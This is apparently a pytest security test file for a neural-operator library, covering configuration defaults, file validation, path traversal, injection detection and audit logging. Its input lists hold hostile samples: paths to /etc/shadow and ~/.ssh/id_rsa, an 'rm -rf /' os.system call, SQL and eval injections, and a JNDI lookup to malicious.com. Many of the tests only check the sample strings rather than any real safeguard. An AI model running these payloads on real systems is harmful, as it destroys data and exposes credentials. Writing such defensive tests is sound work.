"""Security tests for Neural Operator Foundation Lab."""

import pytest
import os
import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock

from neural_operator_lab.config import SecurityConfig, configure_security, get_security_config


class TestSecurityConfig:
    """Test security configuration functionality."""
    
    def test_default_security_config(self):
        """Test default security configuration values."""
        config = SecurityConfig()
        
        assert config.validate_models is True
        assert config.max_model_size == "1GB"
        assert ".pt" in config.allowed_file_types
        assert ".pth" in config.allowed_file_types
        assert config.sandbox_execution is True
        assert config.secure_mode is True
    
    def test_security_config_update(self):
        """Test updating security configuration."""
        config = SecurityConfig()
        
        config.update(validate_models=False, max_model_size="500MB")
        
        assert config.validate_models is False
        assert config.max_model_size == "500MB"
        assert config.secure_mode is True  # Should remain unchanged
    
    def test_security_config_invalid_key(self):
        """Test updating with invalid configuration key."""
        config = SecurityConfig()
        
        with pytest.raises(ValueError, match="Unknown security config"):
            config.update(invalid_key="value")
    
    def test_configure_security_function(self):
        """Test global security configuration function."""
        # Save original config
        original_config = get_security_config()
        
        configure_security(
            validate_models=False,
            max_model_size="2GB",
            sandbox_execution=False
        )
        
        config = get_security_config()
        assert config.validate_models is False
        assert config.max_model_size == "2GB"
        assert config.sandbox_execution is False
        
        # Restore original config
        configure_security(
            validate_models=original_config.validate_models,
            max_model_size=original_config.max_model_size,
            sandbox_execution=original_config.sandbox_execution
        )
    
    @patch.dict(os.environ, {"NEURAL_OP_SECURE_MODE": "true"})
    def test_environment_variable_secure_mode(self):
        """Test security configuration from environment variables."""
        # Reload config module to pick up environment variables
        import importlib
        from neural_operator_lab import config
        importlib.reload(config)
        
        assert config.get_security_config().secure_mode is True
    
    @patch.dict(os.environ, {"NEURAL_OP_VALIDATE_MODELS": "true"})
    def test_environment_variable_validate_models(self):
        """Test model validation from environment variables."""
        import importlib
        from neural_operator_lab import config
        importlib.reload(config)
        
        assert config.get_security_config().validate_models is True


class TestFileValidation:
    """Test file validation and security checks."""
    
    def test_allowed_file_extensions(self, secure_config):
        """Test validation of allowed file extensions."""
        config = SecurityConfig()
        allowed_extensions = config.allowed_file_types
        
        # Test allowed extensions
        assert ".pt" in allowed_extensions
        assert ".pth" in allowed_extensions
        assert ".h5" in allowed_extensions
        assert ".npz" in allowed_extensions
        
        # Test disallowed extensions
        assert ".pkl" not in allowed_extensions  # Pickle files should be restricted
        assert ".exe" not in allowed_extensions
        assert ".sh" not in allowed_extensions
    
    def test_file_size_validation(self, tmp_path):
        """Test file size validation."""
        config = SecurityConfig()
        config.max_model_size = "1MB"  # 1 megabyte limit
        
        # Create a small file (should pass)
        small_file = tmp_path / "small_model.pt"
        small_file.write_bytes(b"0" * 1024)  # 1KB
        
        # Create a large file (should fail validation)
        large_file = tmp_path / "large_model.pt"
        large_file.write_bytes(b"0" * (2 * 1024 * 1024))  # 2MB
        
        # Validation logic would go here in actual implementation
        assert small_file.stat().st_size < 1024 * 1024  # Less than 1MB
        assert large_file.stat().st_size > 1024 * 1024   # Greater than 1MB
    
    def test_malicious_file_detection(self, malicious_model_path):
        """Test detection of potentially malicious files."""
        # This test simulates malicious file detection
        # In actual implementation, this would scan file contents
        
        assert malicious_model_path.exists()
        
        # Read file content for analysis
        content = malicious_model_path.read_bytes()
        
        # Simple heuristic: check for suspicious patterns
        suspicious_patterns = [b"malicious", b"exec", b"eval", b"import os"]
        
        is_suspicious = any(pattern in content for pattern in suspicious_patterns)
        assert is_suspicious  # Should detect malicious content


class TestSecureModelLoading:
    """Test secure model loading functionality."""
    
    def test_safe_model_loading_enabled(self, secure_config):
        """Test that safe model loading is enabled by default."""
        config = SecurityConfig()
        assert config.validate_models is True
        assert config.secure_mode is True
    
    def test_model_validation_checks(self, temp_model_path):
        """Test model validation checks."""
        # Create a mock model file
        temp_model_path.write_bytes(b"mock model data")
        
        config = SecurityConfig()
        
        # Test file existence
        assert temp_model_path.exists()
        
        # Test file extension validation
        assert temp_model_path.suffix == ".pt"
        assert temp_model_path.suffix in config.allowed_file_types
        
        # Test file size (should be small)
        file_size = temp_model_path.stat().st_size
        assert file_size < 1024  # Less than 1KB for this test
    
    @pytest.mark.security
    def test_sandbox_execution_mode(self, secure_config):
        """Test sandbox execution mode."""
        config = SecurityConfig()
        config.sandbox_execution = True
        
        # In actual implementation, this would test sandboxed execution
        # For now, just verify the configuration is set
        assert config.sandbox_execution is True
        
        # Mock testing of restricted operations
        restricted_operations = [
            "import subprocess",
            "import os",
            "open('/etc/passwd')",
            "exec('malicious code')"
        ]
        
        # In sandbox mode, these operations should be blocked
        for operation in restricted_operations:
            # This would be handled by the actual sandbox implementation
            assert config.sandbox_execution  # Sandbox should be enabled


class TestInputValidation:
    """Test input validation and sanitization."""
    
    def test_parameter_validation(self):
        """Test validation of user input parameters."""
        # Test valid parameters
        valid_params = {
            "batch_size": 32,
            "learning_rate": 0.001,
            "epochs": 100,
            "model_name": "transformer_neural_operator"
        }
        
        # Basic validation checks
        assert isinstance(valid_params["batch_size"], int)
        assert valid_params["batch_size"] > 0
        assert isinstance(valid_params["learning_rate"], float)
        assert 0 < valid_params["learning_rate"] < 1
        assert isinstance(valid_params["epochs"], int)
        assert valid_params["epochs"] > 0
        assert isinstance(valid_params["model_name"], str)
        assert len(valid_params["model_name"]) > 0
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/shadow",
            "~/.ssh/id_rsa",
            "./../../secrets.txt"
        ]
        
        for path in malicious_paths:
            # Path should be sanitized and not allow traversal
            normalized_path = Path(path).resolve()
            
            # In actual implementation, paths would be validated
            # against allowed directories and patterns
            assert ".." in path or path.startswith("/") or path.startswith("~")
    
    def test_injection_prevention(self):
        """Test prevention of code injection attacks."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "__import__('os').system('rm -rf /')",
            "eval('malicious_code')",
            "exec(open('backdoor.py').read())",
            "${jndi:ldap://malicious.com/payload}"
        ]
        
        for malicious_input in malicious_inputs:
            # Input should be sanitized
            contains_injection = any(
                pattern in malicious_input.lower()
                for pattern in ["drop", "exec", "eval", "__import__", "${", "jndi"]
            )
            assert contains_injection  # Should detect injection attempts


class TestSecurityLogging:
    """Test security event logging."""
    
    def test_security_event_logging(self):
        """Test that security events are properly logged."""
        # Mock logger for testing
        with patch('logging.getLogger') as mock_logger:
            mock_log_instance = MagicMock()
            mock_logger.return_value = mock_log_instance
            
            # Simulate security events
            security_events = [
                "Blocked malicious file load attempt",
                "Invalid model file extension detected",
                "File size exceeds security limit",
                "Potential path traversal attack blocked"
            ]
            
            for event in security_events:
                # In actual implementation, these would be logged
                mock_log_instance.warning(f"SECURITY: {event}")
            
            # Verify logging was called
            assert mock_log_instance.warning.call_count == len(security_events)
    
    def test_audit_trail(self):
        """Test security audit trail functionality."""
        # Mock audit trail
        audit_events = []
        
        def mock_audit_log(event_type, details):
            audit_events.append({
                "type": event_type,
                "details": details,
                "timestamp": "2025-01-01T00:00:00Z"
            })
        
        # Simulate security events
        mock_audit_log("file_access", {"file": "model.pt", "action": "load"})
        mock_audit_log("security_violation", {"type": "invalid_extension"})
        mock_audit_log("config_change", {"setting": "secure_mode", "value": True})
        
        assert len(audit_events) == 3
        assert audit_events[0]["type"] == "file_access"
        assert audit_events[1]["type"] == "security_violation"
        assert audit_events[2]["type"] == "config_change"


@pytest.mark.security
class TestComplianceChecks:
    """Test security compliance checks."""
    
    def test_secure_defaults(self):
        """Test that secure defaults are enforced."""
        config = SecurityConfig()
        
        # Verify secure defaults
        assert config.validate_models is True
        assert config.sandbox_execution is True
        assert config.secure_mode is True
        assert config.allowed_file_types is not None
        assert len(config.allowed_file_types) > 0
    
    def test_minimum_security_requirements(self):
        """Test minimum security requirements are met."""
        config = SecurityConfig()
        
        # Check that minimum security features are enabled
        security_features = [
            config.validate_models,
            config.sandbox_execution,
            config.secure_mode
        ]
        
        # At least basic security should be enabled
        assert any(security_features), "Minimum security requirements not met"
    
    def test_security_configuration_immutability(self):
        """Test that critical security settings cannot be easily bypassed."""
        config = SecurityConfig()
        
        # Test that secure_mode affects other settings
        original_secure_mode = config.secure_mode
        
        if original_secure_mode:
            # When in secure mode, certain protections should be enforced
            assert config.validate_models is True
            assert config.sandbox_execution is True
            assert len(config.allowed_file_types) > 0